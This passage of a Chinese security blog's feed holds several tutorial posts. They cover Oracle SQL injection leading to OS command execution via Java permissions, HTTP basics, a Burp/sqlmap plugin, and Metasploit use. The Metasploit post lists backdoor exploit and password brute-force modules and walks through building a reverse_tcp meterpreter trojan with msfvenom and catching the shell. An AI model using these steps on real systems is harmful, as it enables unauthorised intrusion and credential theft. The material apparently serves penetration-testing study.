punctuation">,</span>    '<span class="token constant">SYS</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>RuntimePermission</span>'<span class="token punctuation">,</span>    'writeFileDescriptor'<span class="token punctuation">,</span>    <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dbms_java<span class="token punctuation">.</span><span class="token function">grant_permission</span><span class="token punctuation">(</span>    <span class="token constant">SCHEMA</span><span class="token punctuation">,</span>    '<span class="token constant">SYS</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>RuntimePermission</span>'<span class="token punctuation">,</span>    'readFileDescriptor'<span class="token punctuation">,</span>    <span class="token char">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>commit<span class="token punctuation">;</span>end<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第三步：创建函数，调用java代码:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace function <span class="token function">osexec</span><span class="token punctuation">(</span>command in string<span class="token punctuation">)</span> <span class="token keyword">return</span> varchar2 islanguage <span class="token class-name">Java</span>name '<span class="token constant">OS</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span>'<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四步：执行命令:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> osexec<span class="token punctuation">(</span><span class="token string">'net user'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="Oracle中常见的包："><a href="#Oracle中常见的包：" class="headerlink" title="Oracle中常见的包："></a>Oracle中常见的包：</h5><table><thead><tr><th align="center">包名称</th><th align="center">包头文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">dbms_aleri</td><td align="center">dbmsalrt.sql</td><td align="center">异步处理数据库事件</td></tr><tr><td align="center">dbms_application_info</td><td align="center">dbmsutil.sql</td><td align="center">注册当前运行的应用的名称（用于性能监控）</td></tr><tr><td align="center">dbms_aqadm</td><td align="center">dbmsaqad.sql</td><td align="center">与高级队列选项一起使用</td></tr><tr><td align="center">dbms_ddl</td><td align="center">dbmsutil.sql</td><td align="center">重新编译存储子程序和包，分析数据库对象</td></tr><tr><td align="center">dbms_debug</td><td align="center">dbmspb.sql</td><td align="center">PL&#x2F;SQL调试器接口</td></tr><tr><td align="center">dbms_deffr</td><td align="center">dbmsdefr.sql</td><td align="center">远程过程调用应用的接口</td></tr><tr><td align="center">dbms_describe</td><td align="center">dbmsdesc.sql</td><td align="center">说明存储子程序的参数</td></tr><tr><td align="center">dbms_job</td><td align="center">dbmsjob.sql</td><td align="center">按指定的时间或间隔执行用户定义的作业</td></tr><tr><td align="center">dbms_lock</td><td align="center">dbmslock.sql</td><td align="center">管理数据库块</td></tr><tr><td align="center">dbms_output</td><td align="center">dbmsotpt.sql</td><td align="center">将文本行写入内存供以后提取和显示</td></tr><tr><td align="center">dbms_pipe</td><td align="center">dbmspipe.sql</td><td align="center">通过内存“管道”在会话之间发送并接收数据</td></tr><tr><td align="center">dbms_profiler</td><td align="center">dbmspbp.sql</td><td align="center">用于配置PL&#x2F;SQL脚本以鉴别瓶颈问题</td></tr><tr><td align="center">dbms_refresh</td><td align="center">dbmssnap.sql</td><td align="center">管理能够被同步刷新的快照组</td></tr><tr><td align="center">dbms_session</td><td align="center">dbmsutil.sql</td><td align="center">程序执行alter session(改变会话）语句</td></tr><tr><td align="center">dbms_shared_pool</td><td align="center">dbmspool.sql</td><td align="center">查看并管理共享池内容</td></tr><tr><td align="center">dbms_snapshot</td><td align="center">dbmssnap.sql</td><td align="center">刷新，管理快照，并清除快照日志</td></tr><tr><td align="center">dbms_space</td><td align="center">dbmsutil.sql</td><td align="center">获取段空间信息</td></tr><tr><td align="center">dbms_sql</td><td align="center">dbmssql.sql</td><td align="center">执行动态SQL和PL&#x2F;SQL</td></tr><tr><td align="center">dbms_system</td><td align="center">dbmsutil.sql</td><td align="center">开&#x2F;关给定会话的SQL追踪</td></tr><tr><td align="center">dbms_transaction</td><td align="center">dbmsutil.sql</td><td align="center">管理SQL事务</td></tr><tr><td align="center">dbms_utility</td><td align="center">dbmsutil.sql</td><td align="center">多种实用工具：对于一个给定的模式，重新编译存储子程序和包、分析数据库对象、格式化错误信息并调用堆栈用于显示、显示实例是否以并行服务器模式运行、以10ms间隔获取当前时间、决定数据库对象的全名、将一个PL&#x2F;SQL表转换为一个使用逗号分隔的字符串，获取数据库版本&#x2F;操作系统字符串</td></tr><tr><td align="center">utl_raw</td><td align="center">utlraw.sql</td><td align="center">RAW数据转化为字符串</td></tr><tr><td align="center">utl_file</td><td align="center">utlfile.sql</td><td align="center">读&#x2F;写基于ascii字符的操作系统文件</td></tr><tr><td align="center">utl_http</td><td align="center">utlhttp.sql</td><td align="center">从给定的URL得到HTML格式的主页</td></tr><tr><td align="center">dbms_lob</td><td align="center">dbmslob.sql</td><td align="center">管理巨型对象</td></tr></tbody></table><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><ul><li><p>数据类型判断（针对数字型注入）<br>在程序中严格判断数据类型：is_numeric(),ctype_digit()等函数判断数据类型</p></li><li><p>特殊字符转义（针对字符型注入）</p></li><li><p>OWASP ESAPI（为转义哪些特殊字符提供参考，提供了专门对数据库字符编码的接口，根据不同的数据库实现了不同的编码器)</p></li><li><p>使用预编译语句：<br>注：避免使用SQL语句动态拼接的方式</p></li><li><p>框架技术:<br>注：避免使用SQL语句动态拼接的方式，最好使用参数名称或者位置绑定的方式。</p></li><li><p>存储过程:<br>注：避免使用SQL动态拼接的方式</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>为Burp添加sqlmap插件方法(命令行)</title>
      <link href="/2021/12/15/%E4%B8%BABurp%E6%B7%BB%E5%8A%A0sqlmap%E6%8F%92%E4%BB%B6%E6%96%B9%E6%B3%95-%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
      <url>/2021/12/15/%E4%B8%BABurp%E6%B7%BB%E5%8A%A0sqlmap%E6%8F%92%E4%BB%B6%E6%96%B9%E6%B3%95-%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="为-Burp添加-sqlmap插件方法-命令行"><a href="#为-Burp添加-sqlmap插件方法-命令行" class="headerlink" title="为 Burp添加 sqlmap插件方法(命令行):"></a>为 Burp添加 sqlmap插件方法(命令行):</h1><p>首先去网站下载sqlmap插件，下载地址为：<br><a href="http://code.google.com/p/gason/downloads/list">http://code.google.com/p/gason/downloads/list</a>,<br>然后把下载的gason-xxx.jar文件放在和 burp同一目录下，<br>然后在命令行中输入: </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-classpath</span> BurpSuite_x.x.x.jar<span class="token punctuation">;</span>gason-xxx.jar burp.StartBurp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议</title>
      <link href="/2021/12/15/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/12/15/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>http是一种无状态的协议，无状态是指web浏览器与 web服务器不需<br>要建立持久的连接。这意味着客户端向服务器发送请求，服务器给客户<br>端响应，然后连接就关闭了，在服务器端不保留连接的有关信息。也就<br>是说，http请求只能由客户端发起，服务器端不能主动向客户端发送数据</p><h3 id="http请求："><a href="#http请求：" class="headerlink" title="http请求："></a>http请求：</h3><p>请求行，请求头，请求正文</p><h3 id="http响应："><a href="#http响应：" class="headerlink" title="http响应："></a>http响应：</h3><p>响应行，响应头，响应正文</p><h3 id="http请求方法："><a href="#http请求方法：" class="headerlink" title="http请求方法："></a>http请求方法：</h3><p>get<br>head #没有响应正文<br>post<br>put #可以为服务器创建、修改文件(服务器默认关闭)<br>delete #可以删除服务器文件(服务器默认关闭)<br>trace #回显服务器收到的请求<br>connect #用于能动态切换到隧道的代理<br>options #查看服务器支持的请求方式  </p><h3 id="http状态码："><a href="#http状态码：" class="headerlink" title="http状态码："></a>http状态码：</h3><p>200 #客户端请求成功<br>302 #重定向<br>404 #请求资源不存在<br>400 #客户端请求有语法错误<br>401 #请求未经授权<br>403 #服务器收到请求，但是拒绝提供服务<br>500 #服务器内部错误<br>503 #服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p><h3 id="http头-请求头，响应头，普通头，实体头"><a href="#http头-请求头，响应头，普通头，实体头" class="headerlink" title="http头(请求头，响应头，普通头，实体头):"></a>http头(请求头，响应头，普通头，实体头):</h3><p>请求头：<br>host #用于指定被请求资源的internet主机和端口号<br>user-agent #允许客户端将它的操作系统，浏览器和其他属性告诉服务器<br>referer #用户从什么地方来到本页面<br>cookie #一段文本，常用来表示请求者身份<br>range #请求资源的部分内容(不包括响应头的大小)<br>x-forward-for #即XXF头，它代表请求端的ip,可以有多个，中间以逗号隔开<br>accept #指定客户端接收哪些MIME类型的信息<br>accept-charset #用于指定客户端接收的字符集<br>响应头:<br>server #服务器所使用的web服务器名称<br>set-cookie #查看服务器向客户端发送的cookie信息<br>last-modified #资源的最后修改时间<br>location #服务器通过该头告诉浏览器去访问哪个页面<br>refresh #服务器通过该头告诉浏览器定时刷新浏览器<br>普通头：<br>date #表示消息产生的日期和时间<br>connection #http请求是否保持长连接<br>cache-control #用于指定缓存指令，缓存指令是单向且独立的<br>实体头:<br>content-type #用于告诉客户端实际返回的内容的内容类型<br>content-encoding #用于告诉客户端实际返回内容的编码格式<br>content-length #指明实体正文的长度，以字节方式存储的十进制数字来表示<br>last-modified #用于指示资源的最后修改日期和时间</p><h3 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h3><p>http:80 https:443</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit使用</title>
      <link href="/2021/12/13/Metasploit/"/>
      <url>/2021/12/13/Metasploit/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit主要作用："><a href="#Metasploit主要作用：" class="headerlink" title="Metasploit主要作用："></a>Metasploit主要作用：</h1><pre class="line-numbers language-none"><code class="language-none">漏洞验证(poc)漏洞利用(exploit)内网渗透等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="metasploit相关术语"><a href="#metasploit相关术语" class="headerlink" title="metasploit相关术语:"></a>metasploit相关术语:</h1><pre class="line-numbers language-none"><code class="language-none">exploit：攻击通过利用msf中的脚本对目标系统实施精准打击或漏洞验证payload:攻击载荷攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码listener:监听器生成木马之后发给受害主机，监听反弹木马连入本机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="metasploit所在目录："><a href="#metasploit所在目录：" class="headerlink" title="metasploit所在目录："></a>metasploit所在目录：</h1><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="metasploit所在目录目录内容："><a href="#metasploit所在目录目录内容：" class="headerlink" title="metasploit所在目录目录内容："></a>metasploit所在目录目录内容：</h1><pre class="line-numbers language-none"><code class="language-none">data目录#msf攻击过程中使用的一些文件，如字典文件等&#x2F;data&#x2F;exploits&#x2F;#DLL和可执行文件scripts目录#主要包含一些攻击需要用到的脚本&#x2F;scripts&#x2F;meterpreter&#x2F;#ruby脚本&#x2F;scripts&#x2F;ps&#x2F;#powershell脚本&#x2F;scripts&#x2F;resource&#x2F;#rc文件&#x2F;scripts&#x2F;shell#ruby脚本tools目录#存放着大量的实用工具&#x2F;tools&#x2F;exploit&#x2F;#ruby脚本&#x2F;tools&#x2F;memdump&#x2F;#可执行文件&#x2F;tools&#x2F;password&#x2F;#ruby脚本plugins目录#集成了第三方的插件，如sqlmap,nessus等modules目录#msf重要模块&#x2F;modules&#x2F;auxiliary&#x2F;#漏洞辅助模块，多用于扫描&#x2F;modules&#x2F;encoders&#x2F;#编码器模块，对payloads进行编码&#x2F;modules&#x2F;evasion&#x2F;#创建反杀毒软件的木马&#x2F;modules&#x2F;exploits&#x2F;#攻击模块，实施精准打击&#x2F;modules&#x2F;payloads&#x2F;#漏洞载荷模块，通常作用是为渗透测试者打开在目标系统上的控制会话连接modules&#x2F;nops&#x2F;#空指令模块，最典型的空指令就是空操作注：在msf中，所有的模块都是通过ruby语言进行编写的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit:"></a>启动metasploit:</h1><pre class="line-numbers language-none"><code class="language-none">启动之前要开启postgresql数据库服务：service postgresql start或&#x2F;etc&#x2F;init.d&#x2F;postgresql start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="metasploit图形化界面："><a href="#metasploit图形化界面：" class="headerlink" title="metasploit图形化界面："></a>metasploit图形化界面：</h1><pre class="line-numbers language-none"><code class="language-none">armitage安装后需要：msfdb init<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="metasploit常用命令："><a href="#metasploit常用命令：" class="headerlink" title="metasploit常用命令："></a>metasploit常用命令：</h1><p>show命令：</p><pre class="line-numbers language-none"><code class="language-none">show exploits#显示所有的攻击模块show auxiliary#显示所有的辅助模块show targets#显示攻击的目标使用模块:use module_nameuse exp(攻击模块)show payloads#显示当前模块可用的攻击载荷show options#显示当前模块所需设置的攻击参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>search命令：</p><pre class="line-numbers language-none"><code class="language-none">search &lt;关键词&gt;#检索所需要的模块search &lt;关键词&gt; type:exploit#检索所需要的攻击模块search &lt;关键词&gt; type:auxiliary#检索所需要的辅助模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>use命令：</p><pre class="line-numbers language-none"><code class="language-none">use module_name#使用模块(攻击模块或辅助模块)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>info命令：</p><pre class="line-numbers language-none"><code class="language-none">info module_name#显示该模块详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>set、unset命令：</p><pre class="line-numbers language-none"><code class="language-none">set target &lt;目标名&gt;#设置攻击的目标set payload payload_name#使用攻击载荷set &lt;参数名&gt; &lt;值&gt;#设置该模块所需参数unset &lt;参数名&gt;#取消该参数的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>unset -g 命令：</p><pre class="line-numbers language-none"><code class="language-none">unset -g &lt;参数1&gt; &lt;参数2&gt; &lt;...&gt;#批量取消参数的值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>save命令：</p><pre class="line-numbers language-none"><code class="language-none">使用save命令对设置的参数进行保存，在下次启动后可以直接使用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>run、exploit命令：</p><pre class="line-numbers language-none"><code class="language-none">run或exploit#实施攻击<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>banner命令：</p><pre class="line-numbers language-none"><code class="language-none">banner#切换msf启动界面图形<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Samba-MS-RPC-shell命令注入漏洞"><a href="#Samba-MS-RPC-shell命令注入漏洞" class="headerlink" title="Samba MS-RPC shell命令注入漏洞:"></a>Samba MS-RPC shell命令注入漏洞:</h1><ul><li>漏洞产生原因：传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用&#x2F;bin&#x2F;sh,在smb.conf中，导致允许远程命令执行</li><li>攻击模块：<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="Vsftpd源码包后门漏洞："><a href="#Vsftpd源码包后门漏洞：" class="headerlink" title="Vsftpd源码包后门漏洞："></a>Vsftpd源码包后门漏洞：</h1><ul><li>漏洞产生原因：在特定版本的vsftpd服务器程序中，被人恶意植入代码，当用户名以“:)”为结尾，服务器就会在6200端口监听，并且能够执行任意恶意代码</li><li>攻击模块:<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="UnrealiRCd后门漏洞："><a href="#UnrealiRCd后门漏洞：" class="headerlink" title="UnrealiRCd后门漏洞："></a>UnrealiRCd后门漏洞：</h1><ul><li>漏洞产生原因：在2009年11月到2010年6月间分布于某些镜面站点的UnrealiRCd,在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者就能够执行任意代码</li><li>攻击模块：<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="Metasploit对各类密码进行破解："><a href="#Metasploit对各类密码进行破解：" class="headerlink" title="Metasploit对各类密码进行破解："></a>Metasploit对各类密码进行破解：</h1><ul><li>FTP服务：文件传输协议，是用于在网络上进行文件传输的一套标准协议。破解成功之后可查看是否有文件上传权限，若有，可进一步利用，若没有，则可以获取一些敏感数据<ul><li>默认端口：21</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>TELNET服务：telnet协议是TCP&#x2F;IP协议族的一员，是internet远程登录服务的标准协议和主要方式，传输方式为明文传输<ul><li>默认端口:23</li><li>攻击模块：   <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>VNC服务：VNC(Virtual Network Console)是虚拟网络控制台的缩写，是一款远程控制工具<ul><li>默认端口：5900</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;vnc&#x2F;vnc_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>Samba服务：Samba是在linux和unix系统上实现smb协议的一个免费软件，是一种在局域网上共享文件和打印机的一种通信协议<ul><li>默认端口：445</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>SSH服务：SSH为建立在应用层基础上的安全协议，数据加密传输<ul><li>默认端口:22</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_loginauxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li>MYSQL服务：MYSQL是一个关系型数据库管理系统，以root登录之后可执行系统命令<ul><li>默认端口：3306</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login注：使用MySQL口令破解模块，这里一定要自定义一个字典。尽管它选项required是no,但是还是需要进行配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li>MSSQL服务：MSSQL(sql server)是一个关系型数据库管理系统，以sa登录之后可以使用xp_cmdshell执行系统命令<ul><li>默认端口：1433</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>Oracle服务：oracle是一个关系型数据库管理系统<ul><li>默认端口：1521</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>Postgresql服务：postgresql是一个关系型数据库管理系统<ul><li>默认端口：5432</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>HTTP登录认证(路由器)：<ul><li>支持的路由器：dlink</li><li>默认端口：80</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;http&#x2F;dlink_dir_300_615_http_loginauxiliary&#x2F;scanner&#x2F;http&#x2F;dlink_dir_session_cgi_http_loginauxiliary&#x2F;scanner&#x2F;http&#x2F;dlink_dir_615h_http_login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li><li>PcAnyWhere:pcanywhere是一款远程控制软件，你可以将自己的电脑当成主控端去控制远方另一台同样安装有Pcanywhere的电脑(被控端)<ul><li>默认端口：5631</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;pcanywhere&#x2F;pcanywhere_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>FTP匿名登录：<ul><li>使用用户名为anonymous登录ftp服务器</li><li>默认端口：21</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>Tomcat登录破解：<ul><li>默认端口：8080</li><li>攻击模块：  <pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_mgr_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul><h1 id="Metasploit生成木马："><a href="#Metasploit生成木马：" class="headerlink" title="Metasploit生成木马："></a>Metasploit生成木马：</h1><p>生成工具：msfvenom<br>原理：msfvenom是msfpayload、msfencode的结合体，利用msfvenom生成木马程序，让木马程序在目标机器上运行，在本地监听上线<br>msfvenom命令：</p><pre class="line-numbers language-none"><code class="language-none">-p--payload#使用指定的payload-l--list [module_type]#列出模块类型所有的模块,模块类型包括：payloads, encoders, nops, platforms, archs, encrypt, formats, all-n--nopsled#在payload上添加一个[长度]大小的nopsled-f--format#指定payload输出格式，如exe等-e--encoder#使用编码器-a--arch#指定payload架构(x86、x64)--platform#指定payload平台-s--space#指定最终payload的最大长度-b--bad-chars#避免使用的字符，如：“\x00\xff”-i--iterations#指定payload的编码次数-c--add-code#指定要包含的额外的win32 shellcode文件（路径）-x--template#指定一个自定义可执行文件作为模板使用-k--keep#保留--template行为并将有效负载注入为一个新线程-o--out#保存payload到一个文件中-v--var-name#指定用于某些输出格式的自定义变量名-h--help#显示帮助信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：msf生成一个木马并进行远控：</p><pre class="line-numbers language-none"><code class="language-none">（1）msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;&lt;your ip&gt; lport&#x3D;&lt;your port&gt; -f exe -o hdy.exe#生成一个hdy.exe木马注：lhost:攻击机IPlport:攻击机端口（2）use exploit&#x2F;multi&#x2F;handler#使用通用payload处理程序 set payload windows&#x2F;meterpreter&#x2F;reverse_tcp#指定生成的木马程序使用的payload set lhost &lt;your ip&gt;#攻击机的IP set lport &lt;your port&gt;#攻击机的端口 run#运行 (3)在靶机上运行生成的木马 (4)成功的获取靶机shell:  sysinfo#获取系统信息shell#输入shell进入交互式CMD注：如果乱码，使用“chcp 65001”命令进行修正<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统扫描</title>
      <link href="/2021/12/07/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/07/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="目前远程对操作系统进行检测的方法"><a href="#目前远程对操作系统进行检测的方法" class="headerlink" title="目前远程对操作系统进行检测的方法"></a>目前远程对操作系统进行检测的方法</h1><ul><li>被动式方法<br>通过抓包工具收集流经网络的数据包，再从这些数据包中分析出目标主机的操作系统信息</li><li>主动式方法<br>向目标主机发送特定的数据包，目标主机一般会对这些数据包做出响应。通过对这些响应进行分析，就有可能得知远程主机的操作系统类型</li></ul><h1 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h1><ul><li>被动式扫描工具<br>p0f,p0f可以自动地捕获网络中通信的数据包，并对其进行分析<ul><li>使用方法  <pre class="line-numbers language-none"><code class="language-none">p0f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>主动式方法<br>采用向目标发送数据包的方法来检测。需要设计一系列的探针数据包，并将各种操作系统的反应保存为一个数据库。通过将目标主机的响应与数据库中的信息作比对，就可以判断出目标主机的操作系统信息，代表工具nmap</li></ul><h1 id="python-nmap模块操作系统扫描程序"><a href="#python-nmap模块操作系统扫描程序" class="headerlink" title="python-nmap模块操作系统扫描程序"></a>python-nmap模块操作系统扫描程序</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> nmap<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"usage:osscan.py host"</span><span class="token punctuation">)</span>sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>target<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>nm<span class="token operator">=</span>nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span>hosts<span class="token operator">=</span>target<span class="token punctuation">,</span>arguments<span class="token operator">=</span><span class="token string">"-O"</span><span class="token punctuation">)</span><span class="token keyword">for</span> host <span class="token keyword">in</span> nm<span class="token punctuation">.</span>all_hosts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> osmatch <span class="token keyword">in</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'osmatch'</span><span class="token punctuation">]</span>：   <span class="token comment">#nm[host]['osmatch']是一个列表,osmatch变量的值是一个字典</span><span class="token keyword">for</span> osclass <span class="token keyword">in</span> osmatch<span class="token punctuation">[</span><span class="token string">'osclass'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment">#osmatch['osclass']是一个列表</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"设备类型:"</span><span class="token punctuation">,</span>osclass<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">#osclass也是一个字典，osclass中包含有关操作系统的关键信息</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"生产厂家:"</span><span class="token punctuation">,</span>osclass<span class="token punctuation">[</span><span class="token string">'vendor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"匹配度:"</span><span class="token punctuation">,</span>osclass<span class="token punctuation">[</span><span class="token string">'accuracy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"通用平台枚举:"</span><span class="token punctuation">,</span>osclass<span class="token punctuation">[</span><span class="token string">'cpe'</span><span class="token punctuation">]</span><span class="token 